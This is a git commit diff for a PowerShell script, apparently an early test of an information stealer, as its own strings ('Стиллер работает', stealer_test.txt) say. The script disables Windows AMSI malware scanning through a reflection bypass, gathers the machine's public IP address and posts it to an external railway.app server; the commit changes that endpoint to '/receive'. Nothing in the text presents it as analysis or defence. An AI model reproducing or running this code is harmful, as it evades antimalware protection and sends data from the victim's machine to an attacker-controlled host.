0a0eaa8f5b997352681c0267559aa110668a3c54
amirchankambar234-crypto <amirchankambar234@gmail.com>
2026-03-15 21:19:54 +0500

    Update fast.ps1

--- fast.ps1
+++ fast.ps1
@@ -1,7 +1,7 @@
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 $test = @{test="Стиллер работает"; time=(Get-Date); ip=(irm http://api.ipify.org)} | ConvertTo-Json -Compress
 try {
-    irm "https://serv-production-40e7.up.railway.app" -Method POST -Body $test -ContentType "application/json" -UseBasicParsing
+    irm "https://serv-production-40e7.up.railway.app/receive" -Method POST -Body $test -ContentType "application/json" -UseBasicParsing
     "Отправка OK" | Out-File "$env:TEMP\stealer_test.txt"
 } catch {
     "Ошибка: $_" | Out-File "$env:TEMP\stealer_test.txt"
